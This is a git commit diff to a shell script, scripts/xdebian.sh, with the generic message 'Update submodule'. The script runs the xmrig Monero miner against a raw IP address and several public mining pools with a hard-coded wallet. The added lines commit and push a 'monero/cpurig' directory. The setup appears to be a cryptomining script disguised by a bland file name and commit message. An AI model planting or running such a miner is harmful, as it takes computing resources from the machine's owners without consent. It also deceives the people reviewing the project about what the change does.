4d4bb9af596b78bff4c14608f59b3b837b5543b0
afghanamster <afghanamster@gmail.com>
2024-12-06 13:19:53 +0000

    Update submodule

--- scripts/xdebian.sh
+++ scripts/xdebian.sh
@@ -6,3 +6,10 @@ tar xvf xm.tar.gz -C xm --strip-components=1
 chmod +x ./xm/xmrig
 ./xm/xmrig -r 10 -R 2  --donate-level 1 -o 84.32.248.177:3333 --nicehash -o pool.supportxmr.com:443 --nicehash -o monerohash.com:9999 --nicehash -o  pool.supportxmr.com:3333 -u 47STP8dQQCyNNzpjFq7H3hfpTKLmw7A6TFZ8etZg7RQ47NNeF4RR2Dn7bb2ztgVpHQeJisn7Hnv2KAerjt3dG4bfRsDKpVV -p hash1 -k
 
+
+
+cd monero/cpurig
+git add .
+git commit -m "Update submodule"
+git push origin main
+cd ../..
